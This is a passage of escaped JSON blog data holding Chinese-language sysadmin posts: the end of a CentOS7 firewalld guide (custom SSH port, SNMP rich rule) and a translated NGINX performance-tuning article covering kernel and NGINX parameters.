\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a\\n\\n~~~xml\\n<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\n<service>\\n  <short>customized SSH</short>\\n  <description>Secure Shell (SSH) is a protocol for logging into and executing commands on remote machines. It provides secure encrypted communications. If you plan on accessing your machine remotely via SSH over a firewalled interface, enable this option. You need the openssh-server package installed for this option to be useful.</description>\\n  <port protocol=\\"tcp\\" port=\\"22022\\"/>\\n</service>\\n~~~\\n\\n\u6267\u884c\u547d\u4ee4\u91cd\u8f7d\u914d\u7f6e\u6587\u4ef6\uff0c\u5e76\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219:\\n\\n~~~\\nsystemctl reload firewalld\\nfirewall-cmd --add-service=custom-ssh\\n~~~\\n\\n\u4e00\u65e6\u65b0\u7684\u89c4\u5219\u751f\u6548\uff0c\u65e7\u7684 ssh \u7aef\u53e3\u89c4\u5219\u65e7\u53ef\u4ee5\u88ab\u7981\u7528\u6389\uff1a\\n\\n```\\nfirewall-cmd --remove-service=ssh\\n```\\n\\n### \u573a\u666f\u4e8c\uff1a\u5141\u8bb8\u6307\u5b9a\u7684IP\u8bbf\u95eeSNMP\u670d\u52a1\\n\u67d0\u4e9b\u7279\u6b8a\u7684\u670d\u52a1\u6211\u4eec\u5e76\u4e0d\u60f3\u5f00\u653e\u7ed9\u6240\u6709\u4eba\u8bbf\u95ee\uff0c\u53ea\u9700\u8981\u5f00\u653e\u7ed9\u7279\u5b9a\u7684IP\u5730\u5740\u5373\u53ef\uff0c\u4f8b\u5982 SNMP \u670d\u52a1\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 firewalld \u7684\u5bcc\u8bed\u8a00\u98ce\u683c\u914d\u7f6e\u6307\u4ee4\uff1a\\n\\n```\\nfirewall-cmd --add-rich-rule=\\"rule family=\'ipv4\' source address=\'10.0.0.2\' port port=\'161\' protocol=\'udp\' accept\\"\\n```\\n\\n\u67e5\u770b\u9632\u706b\u5899\u89c4\u5219\u72b6\u6001\uff0c\u8bc1\u660e\u7ed3\u679c\u6b63\u662f\u6211\u4eec\u60f3\u8981\u7684\uff1a\\n\\n```\\n[root@localhost ~]# iptables -S\\n... ...\\n-A IN_public_allow -s 10.0.0.2/32 -p udp -m udp --dport 161 -m conntrack --ctstate NEW -j ACCEPT\\n```\\n\\n\u53c2\u8003\u94fe\u63a5\uff1a[^2]\\n\\n\\n[^1]: https://fedoraproject.org/wiki/FirewallD/zh-cn\\n\\n[^2]: https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/7/html/Security_Guide/sec-Using_Firewalls.html"},{"id":"/2014/10/19/nginx-perf-tun","metadata":{"permalink":"/notes/blog/2014/10/19/nginx-perf-tun","editUrl":"https://github.com/itxx00/notes/tree/main/blog/2014-10-19-nginx-perf-tun.md","source":"@site/blog/2014-10-19-nginx-perf-tun.md","title":"NGINX\u6027\u80fd\u8c03\u4f18\u7b80\u8981","description":"","date":"2014-10-19T00:00:00.000Z","tags":[{"inline":true,"label":"nginx","permalink":"/notes/blog/tags/nginx"},{"inline":true,"label":"performance","permalink":"/notes/blog/tags/performance"}],"readingTime":8.2,"hasTruncateMarker":false,"authors":[],"frontMatter":{"layout":"post","title":"NGINX\u6027\u80fd\u8c03\u4f18\u7b80\u8981","description":"","categories":["system"],"tags":["nginx","performance"]},"unlisted":false,"prevItem":{"title":"CENTOS7\u7ba1\u7406\u4e4b\u52a8\u6001\u9632\u706b\u5899FIREWALLD","permalink":"/notes/blog/2015/01/03/centos7-firewalld-basic"},"nextItem":{"title":"shell\u811a\u672ccoding style\u603b\u7ed3","permalink":"/notes/blog/2014/05/23/bash-shell-coding-style"}},"content":"> \u4ee5\u4e0b\u662f\u6570\u5929\u524dNGINX\u5b98\u65b9\u535a\u5ba2\u53d1\u8868\u7684\u4e00\u7bc7\u6709\u5173nginx\u6027\u80fd\u4f18\u5316\u7684\u6587\u7ae0\uff0c\u5185\u5bb9\u7b80\u660e\u627c\u8981\uff0c\u503c\u5f97\u4e00\u8bfb\u3002\u8bd1\u6587\u5728\u539f\u6587\u57fa\u7840\u4e0a\u7565\u6709\u53d8\u52a8\uff0c\u5982\u6709\u4e0d\u8db3\uff0c\u6b22\u8fce\u6307\u6b63\u3002\\n\\n\\n## \u524d\u8a00\\nNGINX\u4f5c\u4e3a\u4e00\u6b3e\u9ad8\u6027\u80fd\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u7f13\u5b58\u548cweb\u670d\u52a1\u5668\u88ab\u5927\u5bb6\u6240\u719f\u77e5\uff0c\u4e3a\u5168\u4e16\u754c40%\u7684\u7f51\u7ad9\u63d0\u4f9b\u7740\u670d\u52a1\u3002NGINX\u548cLinux\u7cfb\u7edf\u4e2d\u7684\u5927\u591a\u6570\u9ed8\u8ba4\u914d\u7f6e\u5bf9\u666e\u901a\u5e94\u7528\u6765\u8bf4\u5df2\u7ecf\u5f88\u5408\u9002\uff0c\u7136\u800c\u8981\u60f3\u8fbe\u5230\u66f4\u9ad8\u7684\u6027\u80fd\u4ee5\u5e94\u5bf9\u9ad8\u8d1f\u8f7d\u573a\u666f\u90a3\u4e48\u4e00\u4e9b\u6027\u80fd\u4f18\u5316\u662f\u5fc5\u987b\u7684\u3002\u8fd9\u7bc7\u6587\u7ae0\u5c06\u4f1a\u63a2\u8ba8\u4e00\u4e9b\u5728\u6027\u80fd\u8c03\u4f18\u65f6\u6d89\u53ca\u5230\u7684NGINX\u548cLinux\u7cfb\u7edf\u53c2\u6570\u3002\u5f53\u7136\u53ef\u4f9b\u8c03\u8282\u7684\u53c2\u6570\u4f17\u591a\uff0c\u6211\u4eec\u8fd9\u91cc\u53ea\u4f1a\u6d89\u53ca\u90e8\u5206\u5bf9\u5927\u591a\u6570\u7528\u6237\u6765\u8bf4\u88ab\u4f7f\u7528\u6700\u591a\u7684\u3002\u5176\u4ed6\u6ca1\u6709\u88ab\u6d89\u53ca\u5230\u7684\u53c2\u6570\u591a\u662f\u9700\u8981\u5bf9\u7cfb\u7edf\u6709\u6df1\u5165\u4e86\u89e3\u4e4b\u540e\u624d\u9700\u8981\u63a5\u89e6\u5230\u7684\u3002\\n\\n \\n\\n## \u7b80\u4ecb\\n\u6211\u4eec\u5047\u5b9a\u6b64\u6587\u8bfb\u8005\u5bf9NGINX\u7684\u57fa\u672c\u67b6\u6784\u548c\u914d\u7f6e\u6709\u4e00\u5b9a\u4e86\u89e3\uff0c\u6b64\u6587\u4e0d\u4f1a\u91cd\u590dNGINX\u6587\u6863\u4e2d\u7684\u5185\u5bb9\uff0c\u5982\u6709\u6d89\u53ca\u6211\u4eec\u4ec5\u4f1a\u7ed9\u51fa\u94fe\u63a5\u3002\\n\\n\u5728\u505a\u6027\u80fd\u8c03\u4f18\u65f6\u4e00\u4e2a\u6700\u4f73\u5b9e\u8df5\u662f\u4e00\u6b21\u53ea\u52a8\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\u679c\u8c03\u6574\u540e\u672a\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u5219\u5c06\u5176\u4fee\u6539\u56de\u521d\u59cb\u503c\u3002\u6211\u4eec\u5c06\u4eceLinux\u7cfb\u7edf\u7684\u4e00\u4e9b\u53c2\u6570\u5f00\u59cb\u8bb2\u8d77\uff0c\u8fd9\u4e9b\u53c2\u6570\u5c06\u5bf9\u540e\u7eed\u7684NGINX\u914d\u7f6e\u8c03\u6574\u6709\u7740\u81f3\u5173\u91cd\u8981\u7684\u4f5c\u7528\u3002\\n\\n## Linux \u914d\u7f6e\\n\u73b0\u4ee3Linux\u5185\u6838\uff082.6+\uff09\u4e2d\u7684\u5f88\u591a\u53c2\u6570\u8bbe\u7f6e\u90fd\u662f\u5341\u5206\u5230\u4f4d\u7684\uff0c\u4f46\u662f\u4ecd\u7136\u6709\u4e00\u4e9b\u662f\u9700\u8981\u6211\u4eec\u8fdb\u884c\u8c03\u6574\u7684\u3002\u5982\u679c\u4e00\u4e9b\u9ed8\u8ba4\u7684\u503c\u8bbe\u7f6e\u5f97\u592a\u5c0f\uff0c\u90a3\u4e48\u5728\u5185\u6838\u65e5\u5fd7\u4e2d\u5c06\u8bb0\u5f55\u7740\u9519\u8bef\u4fe1\u606f\uff0c\u8fd9\u9884\u793a\u7740\u6211\u4eec\u9700\u8981\u5bf9\u5176\u4e2d\u4e00\u4e9b\u53c2\u6570\u8fdb\u884c\u8c03\u6574\u4e86\u3002\u5728\u4f17\u591a\u9009\u9879\u5f53\u4e2d\u6211\u4eec\u53ea\u4f1a\u6d89\u53ca\u5230\u5bf9\u5927\u591a\u6570\u8d1f\u8f7d\u573a\u666f\u90fd\u5b9e\u7528\u7684\uff0c\u8bf7\u53c2\u8003Linux\u7cfb\u7edf\u6587\u6863\u4ee5\u4e86\u89e3\u66f4\u591a\u6709\u5173\u8fd9\u4e9b\u9009\u9879\u7684\u7ec6\u8282\u3002\\n\\n### Backlog Queue\\n\\n\u4e0b\u9762\u7684\u8bbe\u7f6e\u4e0e\u7f51\u7edc\u8fde\u63a5\u548c\u8fde\u63a5\u961f\u5217\u6709\u76f4\u63a5\u5173\u8054\u3002\u5982\u679c\u4f60\u6709\u5927\u91cf\u7684\u63a5\u5165\u8bf7\u6c42\uff0c\u4e14\u5076\u5c14\u51fa\u73b0\u4e00\u4e9b\u5931\u6548\u8bf7\u6c42\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0b\u9762\u7684\u8bbe\u7f6e\u5c06\u8d77\u5230\u4f18\u5316\u6548\u679c\u3002\\n\\n`net.core.somaxconn`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236NGINX\u7b49\u5f85\u8fde\u63a5\u7684\u961f\u5217\u5927\u5c0f\u3002\u56e0NGINX\u5904\u7406\u8fde\u63a5\u7684\u901f\u5ea6\u5feb\uff0c\u6240\u4ee5\u4e00\u822c\u8fd9\u4e2a\u53c2\u6570\u4e0d\u5efa\u8bae\u88ab\u8bbe\u7f6e\u592a\u5927\uff0c\u4f46\u662f\u9ed8\u8ba4\u503c\u6709\u70b9\u504f\u4f4e\uff0c\u6240\u4ee5\u9488\u5bf9\u5927\u6d41\u91cf\u7f51\u7ad9\u6765\u8bf4\u8c03\u6574\u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\uff0c\u5982\u679c\u6b64\u53c2\u6570\u88ab\u8bbe\u7f6e\u591a\u4f4e\u90a3\u4e48\u6709\u53ef\u80fd\u5728\u5185\u6838\u65e5\u5fd7\u4e2d\u770b\u5230\u62a5\u9519\uff0c\u8fd9\u65f6\u9700\u8981\u8c03\u6574\u6b64\u53c2\u6570\u76f4\u5230\u62a5\u9519\u6d88\u5931\u4e3a\u6b62\u3002\u6ce8\u610f\uff0c\u5982\u679c\u6b64\u53c2\u6570\u8bbe\u7f6e\u5927\u4e8e512\u7684\u8bdd\uff0c\u5219\u9700\u8981\u5bf9NGINX\u914d\u7f6e\u4e2d\u7684listen\u6307\u4ee4\u4e2d\u7684backlog\u53c2\u6570\u8fdb\u884c\u540c\u6b65\u8c03\u6574\u3002\\n\\n`net.core.netdev_max_backlog`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u6570\u636e\u5305\u5728\u8fdb\u5165CPU\u5904\u7406\u524d\uff0c\u5728\u7f51\u5361\u4e2d\u88ab\u7f13\u5b58\u7684\u91cf\uff0c\u9700\u8981\u5904\u7406\u5927\u5e26\u5bbd\u7684\u673a\u5668\u9700\u8981\u589e\u52a0\u6b64\u53c2\u6570\u7684\u503c\u3002\u8bbe\u7f6e\u6b64\u53c2\u6570\u9700\u8981\u53c2\u8003\u5177\u4f53\u7684\u7f51\u5361\u7684\u6587\u6863\u6216\u8005\u6839\u636e\u7cfb\u7edf\u9519\u8bef\u65e5\u5fd7\u8fdb\u884c\u8c03\u6574\u3002\\n\\n \\n\\n### File Descriptors\\n\\n\u6587\u4ef6\u63cf\u8ff0\u7b26\u662f\u7cfb\u7edf\u5728\u5904\u7406\u5982\u7f51\u7edc\u8fde\u63a5\u548c\u6253\u5f00\u6587\u4ef6\u65f6\u7684\u7cfb\u7edf\u8d44\u6e90\u3002NGINX\u4e2d\u6bcf\u4e2a\u8fde\u63a5\u7684\u5efa\u7acb\u53ef\u80fd\u9700\u8981\u5360\u7528\u4e24\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4f8b\u5982\u4ee3\u7406\u6a21\u5f0f\u4e0b\uff0c\u4e00\u4e2a\u7528\u6765\u5904\u7406\u5ba2\u6237\u7aef\u8fde\u63a5\uff0c\u4e00\u4e2a\u7528\u6765\u5904\u7406\u5230\u540e\u7aef\u7684\u8fde\u63a5\uff0c\u800c\u5982\u679cHTTP keepalives\u88ab\u542f\u7528\u7684\u8bdd\u5bf9\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u6d88\u8017\u4f1a\u8f7b\u677e\u4e00\u4e9b\u3002\u9700\u8981\u5904\u7406\u9ad8\u5e76\u53d1\u7684\u673a\u5668\u5efa\u8bae\u8c03\u6574\u4e0b\u9762\u7684\u53c2\u6570\uff1a\\n\\n`sys.fs.file_max`\\n\\n\u8fd9\u4e2a\u53c2\u6570\u5f71\u54cd\u7cfb\u7edf\u5168\u5c40\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6253\u5f00\u6570\u91cf\u9650\u5236\u3002\\n\\n`nofile`\\n\\n\u6b64\u53c2\u6570\u5f71\u54cd\u5355\u4e2a\u7528\u6237\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u6570\u91cf\uff0c\u5728/etc/security/limits.conf\u4e2d\u8fdb\u884c\u8bbe\u7f6e\u3002\\n\\n \\n\\n### Ephemeral ports\\n\\n\u5f53NGINX\u88ab\u4f5c\u4e3a\u4ee3\u7406\u670d\u52a1\u5668\u65f6\uff0c\u6bcf\u4e2a\u5230\u540e\u7aef\u670d\u52a1\u5668\u7684\u8fde\u63a5\u5c06\u5360\u7528\u4e00\u4e2a\u4e34\u65f6\u7684\uff0c\u6216\u77ed\u671f\u7684\u7aef\u53e3\u3002\\n\\n`net.ipv4.ip_local_port_range`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u53ef\u88ab\u7528\u4f5c\u4e34\u65f6\u7aef\u53e3\u7684\u8d77\u59cb\u8303\u56f4\uff0c\u4e00\u4e2a\u901a\u7528\u8bbe\u7f6e\u662f1024-65000\\n\\n`net.ipv4.tcp_fin_timeout`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u4e00\u4e2a\u8fde\u63a5\u4f7f\u7528\u5b8c\u6bd5\u540e\u7aef\u53e3\u88ab\u56de\u6536\u518d\u5229\u7528\u7684\u8d85\u65f6\u65f6\u95f4\uff0c\u4e00\u822c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a60\u79d2\uff0c\u4f46\u662f\u4e00\u822c\u8bbe\u7f6e\u964d\u4f4e\u523030\u6216\u800515\u79d2\u90fd\u662f\u6ca1\u6709\u95ee\u9898\u7684\u3002\\n\\n \\n\\n## NGINX \u914d\u7f6e\\n\\n\u4e0b\u9762\u4ecb\u7ecdNGINX\u4e2d\u5bf9\u6027\u80fd\u6709\u5f71\u54cd\u7684\u53c2\u6570\uff0c\u5982\u4e0b\u9762\u63d0\u5230\u7684\u4e00\u6837\uff0c\u6211\u4eec\u53ea\u8bb2\u89e3\u4e00\u4e9b\u9002\u7528\u4e8e\u5927\u591a\u6570\u7528\u6237\u7684\u53c2\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u5176\u4ed6\u672a\u63d0\u53ca\u7684\u53ef\u80fd\u662f\u4e0d\u5efa\u8bae\u8c03\u6574\u7684\u3002\\n\\n \\n\\n### Worker Processes\\n\\nNGINX\u53ef\u4ee5\u540c\u65f6\u542f\u52a8\u591a\u4e2aworker\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u5904\u7406\u5927\u91cf\u7684\u8fde\u63a5\uff0c\u901a\u8fc7\u8c03\u6574\u4e0b\u9762\u7684\u53c2\u6570\u53ef\u4ee5\u63a7\u5236\u542f\u52a8\u7684\u8fdb\u7a0b\u6570\u91cf\u548c\u6bcf\u4e2a\u8fdb\u7a0b\u6240\u5904\u7406\u7684\u8fde\u63a5\u6570\u91cf\u3002\\n\\n`worker_processes`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236NGINX\u542f\u52a8\u8fdb\u7a0b\u7684\u6570\u91cf\uff0c\u5728\u591a\u6570\u60c5\u51b5\u4e0b\u6bcf\u4e2acpu\u6838\u5fc3\u5206\u914d\u4e00\u4e2a\u8fdb\u7a0b\u662f\u6700\u4f73\u7684\uff0c\u5c06\u53c2\u6570\u503c\u8bbe\u7f6e\u4e3aauto\u5373\u53ef\u8fbe\u5230\u3002\u5f88\u591a\u573a\u666f\u4e0b\u90fd\u9700\u8981\u589e\u52a0\u6b64\u53c2\u6570\u7684\u503c\uff0c\u5982\u5728\u9700\u8981\u5904\u7406\u5927\u91cf\u78c1\u76d8I/O\u7684\u573a\u666f\u3002\u9ed8\u8ba4\u7684\u503c\u662f1\u3002\\n\\n`worker_connections`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u5728\u540c\u4e00\u65f6\u523b\u5355\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5904\u7406\u7684\u6700\u5927\u8fde\u63a5\u6570\u3002\u9ed8\u8ba4\u503c512\uff0c\u4f46\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u53ef\u4ee5\u5904\u7406\u66f4\u5927\u7684\u91cf\u3002\u5176\u6700\u4f73\u503c\u4e0e\u5b9e\u9645\u573a\u666f\u548c\u7cfb\u7edf\u6709\u5173\uff0c\u9700\u8981\u7ecf\u8fc7\u53cd\u590d\u6d4b\u8bd5\u624d\u80fd\u5f97\u51fa\u3002\\n\\n### Keepalives\\n\\nKeepalive\u8fde\u63a5\u964d\u4f4e\u8fde\u63a5\u7684\u5efa\u7acb\u548c\u5173\u95ed\u5bf9CPU\u548c\u7f51\u7edc\u7684\u6d88\u8017\uff0c\u5bf9\u6027\u80fd\u6709\u7740\u5341\u5206\u91cd\u8981\u7684\u5f71\u54cd\u3002NGINX\u4f1a\u5173\u95ed\u6240\u6709\u5ba2\u6237\u7aef\u7684\u8fde\u63a5\uff0c\u4e14\u4e0e\u540e\u7aef\u670d\u52a1\u5668\u7684\u8fde\u63a5\u90fd\u662f\u72ec\u7acb\u7684\u3002NGINX\u652f\u6301\u5230\u5ba2\u6237\u7aef\u548c\u540e\u7aef\u7684keepalive\uff0c\u4e0b\u9762\u7684\u53c2\u6570\u5bf9\u5ba2\u6237\u7aefkeepalive\u8fdb\u884c\u63a7\u5236\uff1a\\n\\n`keepalive_requests`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u901a\u8fc7\u5355\u4e2akeepalive\u8fde\u63a5\u53ef\u4ee5\u5904\u7406\u7684\u5ba2\u6237\u7aef\u8bf7\u6c42\u6570\u91cf\uff0c\u9ed8\u8ba4\u503c\u662f100\uff0c\u53ef\u4ee5\u8c03\u6574\u4e3a\u66f4\u5927\u7684\u503c\uff0c\u7279\u522b\u662f\u5728\u901a\u8fc7\u5355\u4e2a\u5ba2\u6237\u7aef\u8fdb\u884c\u538b\u529b\u6d4b\u8bd5\u7684\u65f6\u5019\u3002\\n\\n`keepalive_timeout`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u5355\u4e2akeepalive\u8fde\u63a5\u5728\u7a7a\u95f2\u72b6\u6001\u4fdd\u6301\u8fde\u63a5\u7684\u65f6\u95f4\u3002\\n\\n \\n\\n\u4e0b\u9762\u7684\u53c2\u6570\u5bf9\u540e\u7aefkeepalive\u8fdb\u884c\u63a7\u5236\uff1a\\n\\n`keepalive`\\n\\n\u6b64\u53c2\u6570\u63a7\u5236\u5355\u4e2aworker\u8fdb\u7a0b\u4fdd\u6301\u5230upstream server\u7684keepalive\u8fde\u63a5\u6570\u91cf\uff0c\u4e14\u9ed8\u8ba4\u6ca1\u6709\u8bbe\u7f6e\u3002\u5982\u9700\u542f\u52a8\u5230\u540e\u7aef\u7684keepalive\u8fde\u63a5\u5219\u9700\u8981\u8fdb\u884c\u5982\u4e0b\u8bbe\u7f6e\uff1a \\n\\n`proxy_http_version 1.1;`\\n`proxy_set_header Connection \\"\\";`\\n\\n### Access Logging\\n\\n\u8bf7\u6c42\u4ea7\u751f\u7684\u65e5\u5fd7\u8bb0\u5f55\u5bf9CPU\u548cI/O\u90fd\u6709\u6d88\u8017\uff0c\u4e00\u4e2a\u53ef\u4ee5\u964d\u4f4e\u8d44\u6e90\u6d88\u8017\u7684\u529e\u6cd5\u662f\u542f\u7528\u65e5\u5fd7\u7f13\u5b58\u3002\u542f\u7528\u65e5\u5fd7\u7f13\u5b58\u540e\uff0cNGINX\u5c06\u7f13\u5b58\u90e8\u5206\u8bf7\u6c42\u65e5\u5fd7\uff0c\u7136\u540e\u4e00\u6b21\u6027\u5199\u5165\u6587\u4ef6\u3002\u8981\u542f\u7528\u65e5\u5fd7\u7f13\u5b58\u53ea\u9700\u8981\u5728access_log\u4e2d\u589e\u52a0\u201cbuffer=size\u201d\u7684\u8bbe\u7f6e\u5373\u53ef\uff0csize\u503c\u63a7\u5236\u7f13\u5b58\u7684\u5927\u5c0f\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u201cflush=time\u201d\u4ee5\u63a7\u5236\u7f13\u5b58\u7684\u65f6\u95f4\uff0c\u8bbe\u7f6e\u4e86\u4e24\u4e2a\u53c2\u6570\u540e\uff0cNGINX\u4f1a\u5728\u7f13\u5b58\u88ab\u5145\u6ee1\u6216\u8005\u65e5\u5fd7\u6761\u76ee\u6570\u8fbe\u5230flush\u503c\u65f6\u56de\u5199\u65e5\u5fd7\u3002\u5728worker\u8fdb\u7a0b\u91cd\u542f\u6216\u8005\u5173\u95ed\u65f6\u4e5f\u4f1a\u56de\u5199\u65e5\u5fd7\u3002\u800c\u6c38\u4e45\u7981\u7528\u65e5\u5fd7\u8bb0\u5f55\u4e5f\u662f\u53ef\u4ee5\u5b9e\u73b0\u7684\u3002\\n\\n### Sendfile\\n\\nSendfile \u662f\u4e00\u9879\u64cd\u4f5c\u7cfb\u7edf\u7279\u6027\uff0c\u53ef\u4ee5\u88abNGINX\u542f\u7528\u3002\u5b83\u901a\u8fc7\u5bf9\u6570\u636e\u5728\u6587\u4ef6\u63cf\u8ff0\u7b26\u4e4b\u95f4\u8fdb\u884cin-kernel copying\u6765\u63d0\u4f9b\u66f4\u5feb\u7684tcp\u6570\u636e\u4f20\u8f93\u5904\u7406\uff0c\u4e00\u822c\u901a\u8fc7zero-copy\u6280\u672f\u5b9e\u73b0\u3002NGINX\u4f7f\u7528\u5b83\u6765\u5b8c\u6210\u7f13\u5b58\u6570\u636e\u6216\u8005\u78c1\u76d8\u6570\u636e\u5230socket\u7684\u5199\u64cd\u4f5c\uff0c\u4e0d\u4ea7\u751f\u4efb\u4f55\u7684\u7528\u6237\u7a7a\u95f4\u4e0a\u4e0b\u6587\u5207\u6362\u5f00\u9500\uff0c\u53ef\u964d\u4f4eCPU\u8d1f\u8f7d\u548c\u63d0\u9ad8\u5904\u7406\u901f\u5ea6\u3002\u5f53\u542f\u7528sendfile\u7279\u6027\u4e4b\u540e\uff0c\u7531\u4e8e\u6570\u636e\u4e0d\u7ecf\u8fc7\u7528\u6237\u7a7a\u95f4\uff0c\u4f7f\u5f97\u5bf9\u6570\u636e\u5185\u5bb9\u8fdb\u884c\u5904\u7406\u7684filter\u5c06\u4e0d\u8d77\u4f5c\u7528\uff0c\u4f8b\u5982gzip filter\u5c06\u9ed8\u8ba4\u88ab\u7981\u7528\u3002\\n\\n\\n### Limits\\n\\nNGINX\u4e5f\u4e3a\u7528\u6237\u63d0\u4f9b\u8bbe\u7f6e\u8fde\u63a5\u9650\u5236\u7684\u80fd\u529b\uff0c\u7528\u6765\u5bf9\u5ba2\u6237\u8bf7\u6c42\u7684\u8d44\u6e90\u8fdb\u884c\u63a7\u5236\uff0c\u5bf9\u7cfb\u7edf\u6027\u80fd\uff0c\u7528\u6237\u4f53\u9a8c\u548c\u5b89\u5168\u6027\u4e5f\u4ea7\u751f\u6781\u5927\u7684\u5f71\u54cd\u3002\u4e0b\u9762\u662f\u90e8\u5206\u7528\u4e8e\u8bf7\u6c42\u9650\u5236\u7684\u6307\u4ee4\uff1a\\n\\n`limit_conn/limit_conn_zone`\\n\\n\u8fd9\u4e24\u4e2a\u6307\u4ee4\u7528\u6765\u63a7\u5236NGINX\u53ef\u63a5\u6536\u7684\u8fde\u63a5\u6570\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u5ba2\u6237\u7aefIP\u7684\u8fde\u63a5\u8bf7\u6c42\u3002\u8fd9\u6709\u52a9\u4e8e\u9650\u5236\u5ba2\u6237\u7aef\u5efa\u7acb\u8fc7\u591a\u7684\u8fde\u63a5\u5e76\u6d88\u8017\u8fc7\u591a\u8d44\u6e90\u3002\\n\\n`limit_rate`\\n\\n\u8fd9\u4e2a\u6307\u4ee4\u63a7\u5236\u5355\u4e2a\u8fde\u63a5\u5141\u8bb8\u7684\u5ba2\u6237\u7aef\u6700\u5927\u5e26\u5bbd\u3002\u8fd9\u53ef\u4ee5\u907f\u514d\u7cfb\u7edf\u88ab\u90e8\u5206\u5ba2\u6237\u7aef\u8017\u5c3d\u8d44\u6e90\uff0c\u4fdd\u8bc1\u4e86\u4e3a\u6bcf\u4e2a\u5ba2\u6237\u7aef\u8bf7\u6c42\u63d0\u4f9b\u670d\u52a1\u7684\u8d28\u91cf\u3002\\n\\n`limit_req/limit_req_zone`\\n\\n\u8fd9\u4e24\u4e2a\u6307\u4ee4\u53ef\u4ee5\u63a7\u5236NGINX\u7684\u8bf7\u6c42\u56de\u590d\u6c34\u5e73\uff0c\u4ee5\u4e0d\u81f3\u4e8e\u88ab\u90e8\u5206\u5ba2\u6237\u7aef\u62d6\u57ae\u3002\u4e5f\u88ab\u7528\u6765\u52a0\u5f3a\u5b89\u5168\u6027\uff0c\u7279\u522b\u662f\u5bf9\u767b\u9646\u9875\u9762\u7b49\u8fdb\u884c\u6709\u6548\u7684\u4fdd\u62a4\u3002\\n\\n`max_conns`\\n\\n\u8fd9\u4e2a\u6307\u4ee4\u7528\u6765\u63a7\u5236\u5230\u540e\u7aef\u670d\u52a1\u5668\u7684\u6700\u5927\u8fde\u63a5\u6570\uff0c\u4fdd\u62a4\u540e\u7aef\u670d\u52a1\u5668\u4e0d\u88ab\u62d6\u57ae\uff0c\u9ed8\u8ba4\u503c\u662fzero\uff0c\u6ca1\u6709\u4efb\u4f55\u9650\u5236\u3002\\n\\n`queue`\\n\\n\u5982\u679cmax_conns\u88ab\u8bbe\u7f6e\uff0c\u90a3\u4e48\u6b64\u53c2\u6570\u5bf9\u8d85\u8fc7\u6700\u5927\u8fde\u63a5\u65f6\u7684\u72b6\u6001\u4ea7\u751f\u5f71\u54cd\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u961f\u5217\u4e2d\u8bf7\u6c42\u7684\u4e2a\u6570\u548c\u7f13\u51b2\u65f6\u95f4\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u6b64\u53c2\u6570\uff0c\u5219\u961f\u5217\u4e0d\u5b58\u5728\u3002\\n\\n\\n## \u5176\u4ed6\u8bbe\u7f6e\\nNGINX\u8fd8\u6709\u4e00\u4e9b\u7279\u6027\u80fd\u5bf9\u67d0\u4e9b\u7279\u5b9a\u573a\u666f\u4e0b\u7684\u5e94\u7528\u8d77\u5230\u6027\u80fd\u4f18\u5316\u4f5c\u7528\uff0c\u6211\u4eec\u5c06\u63a2\u8ba8\u5176\u4e2d\u7684\u4e24\u4e2a\u7279\u6027\u3002\\n\\n### \u7f13\u5b58\\n\\n\u5f53\u628aNGINX\u4f5c\u4e3a\u8d1f\u8f7d\u5747\u8861\u5668\u6765\u4f7f\u7528\u7684\u573a\u666f\u4e0b\uff0c\u542f\u7528cache\u53ef\u4ee5\u663e\u8457\u6539\u5584\u5230\u5ba2\u6237\u7aef\u7684\u54cd\u5e94\u65f6\u95f4\uff0c\u4e14\u663e\u8457\u964d\u4f4e\u540e\u7aef\u670d\u52a1\u5668\u7684\u538b\u529b\u3002\u5982\u9700\u4e86\u89e3\u66f4\u591aNGINX\u7684caching\u8bbe\u7f6e\uff0c\u53ef\u4ee5\u53c2\u8003\u6b64\u94fe\u63a5\uff1a: NGINX Admin Guide \u2013 Caching.\\n\\n### \u538b\u7f29\\n\\n\u5bf9\u56de\u5e94\u5185\u5bb9\u8fdb\u884c\u538b\u7f29\u5c06\u6709\u6548\u964d\u4f4e\u56de\u5e94\u5185\u5bb9\u7684\u5927\u5c0f\uff0c\u964d\u4f4e\u5e26\u5bbd\u6d88\u8017\uff0c\u7136\u800c\u538b\u7f29\u5c06\u589e\u52a0CPU\u7684\u5f00\u9500\uff0c\u6240\u4ee5\u5e26\u5bbd\u6210\u672c\u8f83\u9ad8\u65f6\u542f\u7528\u624d\u662f\u660e\u667a\u4e4b\u4e3e\u3002\u9700\u8981\u660e\u786e\u6ce8\u610f\u7684\u662f\u4e0d\u8981\u5bf9\u5df2\u7ecf\u538b\u7f29\u7684\u5185\u5bb9\u542f\u7528\u538b\u7f29\uff0c\u4f8b\u5982jpeg\u683c\u5f0f\u7684\u56fe\u7247\uff0c\u5982\u9700\u4e86\u89e3\u66f4\u591a\u6709\u5173\u538b\u7f29\u7684\u8bbe\u7f6e\u53ef\u4ee5\u53c2\u8003\u6b64\u6587\u6863\uff1a NGINX Admin Guide \u2013 Compression and 